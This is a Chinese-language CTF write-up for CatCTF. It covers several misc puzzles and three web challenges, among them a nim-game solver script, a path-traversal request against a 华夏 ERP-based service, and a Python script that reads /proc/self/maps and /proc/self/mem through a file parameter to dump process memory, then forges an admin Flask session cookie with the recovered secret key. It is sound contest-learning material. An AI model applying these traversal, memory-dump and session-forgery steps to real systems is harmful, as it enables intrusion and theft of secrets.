# CatCTF Writeup by ZeroAurora

## Misc

### CatFlag

签到题，直接 cat flag 就行。不过至今没搞清楚原理是什么（

### Nepnep 祝你新年快乐啦！

最后一帧，任意非编软件或者好一点的播放器就能直接查看。

### CatchCat

把下载得到的 txt 丢到在线 GPS 查看网站就行。

### MeowMeow

Hex 编辑器打开，跳转到图片末尾，此时编辑器展现的字符排列正好可以组成字符（类似 asciiart），看图说话就行。

### catnim

pwntools 交互题。一开始以为是 Nim 语言的事情（？），不过很快就找到了原来 nim 指的是 [尼姆游戏](https://zh.wikipedia.org/wiki/%E5%B0%BC%E5%A7%86%E6%B8%B8%E6%88%8F)。

参照 Wikipedia 提供的解决方法，编写 exp 如下：

```python
from pwn import *

from functools import reduce


r = remote("223.112.5.156", 51682)

print(r.recvlines(7)) # intro
r.sendline(b"n")

i = 0
while True:
    where = 0
    count = 0

    recv = r.recvline(keepends=False) # now pile: ...
    print(recv)
    now_pile = recv.decode().lstrip("Now pile: ").split()

    # first hand: calculate nimsum
    nimsum = int(reduce(lambda x, y: int(x) ^ int(y), now_pile)) # 写wp的时候发现最外圈这个int好像没啥意义，不过不删了
    print(f"nimsum:{nimsum}")
    for stack in now_pile:
        stack_height = int(stack)
        if (stack_height ^ nimsum) < stack_height:
            count = stack_height - (stack_height ^ nimsum)
            break
        where += 1

    print(f"where: {where}, count: {count}")
    
    print(r.recvuntil(b":")) # where:
    r.sendline(str(where).encode())
    print(r.recvuntil(b":")) # count:
    r.sendline(str(count).encode())

    print(r.recvline()) # AI fetch...
    print(r.recvline()) # xor:xxx
    print(r.recvline()) # now pile: ...
    i += 1
```

直接跑到 EOF 为止。

## Web

### ez_js

签到题，直接看 `/js/game.js`，L46 有 flag 路径 `/g3t_fl4g`，直接访问即可。

### ezbypass

打开环境，在 devtools 随便翻翻，找到了“华夏 ERP”字样，遂以“华夏 ERP 绕过”为关键词搜索，找到 [这篇文章](http://www.hackdig.com/05/hack-367602.htm)。

于是用环境中的某个 css/js 为起点，一路 .. 回根目录，拿到 flag.html。

exp 忘记存了……悲，随便编一个文件名得了。

```
GET /js/jquery/jquery.xxx.js/../../../flag.html
Host: 127.0.0.1
(...)
```

### catcat

套着 Web 皮的 Misc（？），跨年熬夜做两小时，后遗症是头痛至今（

同样是没有当场写 wp（好在存了 exp），比赛结束又不给环境了，于是下面也是基于回忆的答案，仅供参考求轻喷（

进环境，点进一个 info 页面，发现 URL 参数里面有 file 字段，猜测是文件系统访问；同时注意到页面返回的是 bytestring，说明这道题肯定要和二进制打交道了。

不管怎么说先随便来个逝世：

```
http://223.112.5.156:63365/info?file=./../../../../bin/ls
```

成功返回了 ls 的 bytestring。据此可确信是文件系统访问。随意摸索可以找到 `./../app.py` 和 `./../cat.py`。

阅读 app.py，可知程序将 flag 读入内存之后就已经删除。可想两种方法：dump disk 和 dump memory。前者因为文件太大，且容器不提供磁盘访问，故排除。

考虑后者。Linux 的文件目录结构里有一个特殊的文件夹 `/proc`，是实际仅对进程可见的虚拟文件系统，包含关于进程的各种信息。其中有没有可能就有程序的内存文件呢？

一查还真有：`/proc/self/mem`，提供了对进程本身内存的访问。但是直接访问这个文件会出 I/O 错误，怎么办？再看看，`/proc/self/maps` 提供了这个文件中每一块内存的地址和对应的进程。

回过头来看题目，天助我也，参数中的 start 和 end 字段正好能够达到读取部分文件的目的。于是抄了一段 [StackOverflow](https://unix.stackexchange.com/a/6302)，exp 如下：

```python
import re
import requests
from bs4 import BeautifulSoup

maps_html = BeautifulSoup(requests.get("http://223.112.5.156:63365/info?file=./../../../proc/self/maps").text)
maps: str = eval(maps_html.p.string).decode()

output_file = open("self.dump", 'wb')
i = 1
for line in maps.split("\n"):  # for each mapped region
    print(i)
    i+=1
    m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
    if m.group(3) == 'r':  # if this is a readable region
        start = int(m.group(1), 16)
        end = int(m.group(2), 16)
        mem_html = BeautifulSoup(requests.get(f"http://223.112.5.156:63365/info?file=./../../../proc/self/mem&start={start}&end={end}").text)
        chunk: bytes = eval(mem_html.p.string)
        output_file.write(chunk)  # dump contents to output
output_file.close()
```

之后有两种解法：一种是利用 app.py 给的 `*abcdefgh` 进行一个搜索，得到 secret key，然后手动签一个 session cookie：

```python
from flask import Flask, session

app = Flask(__name__)

app.secret_key = b"596287024f0c4ac9b2c726da7202d8df*abcdefgh"

@app.get("/")
def main():
    session["admin"] = 1
    return "" # then get cookie from browser
```

另外一种解法是直接找 flag。但是我想破了头都想不出为什么 flag 是 `catctf{xxx}` 而不是之前遇见的 `CatCTF{xxx}` 和比赛规则中的 `flag{xxx}`，格式不统一属实气人（恼

## 结语

以上就是我做出来的全部题目，不多，总共耗时 7 小时左右，但整体过程还算愉快~本 wp 没有图片，还有很多处按照记忆编写的，希望能被接受吧（悲

锤三个地方：一个是上文提到的 Flag 格式不统一；一个是比赛规则只写获奖者要写 wp，但是因为我没加群所以刚刚才知道每个人都要写 wp，没有边做题边写 wp 习惯的我“玛恩纳摸澄闪——输麻了“；三是我不玩王者荣耀啊啊啊（全恼）！

总之感谢各位师傅们为了可爱的猫猫辛苦出题运维做题！新年快乐！
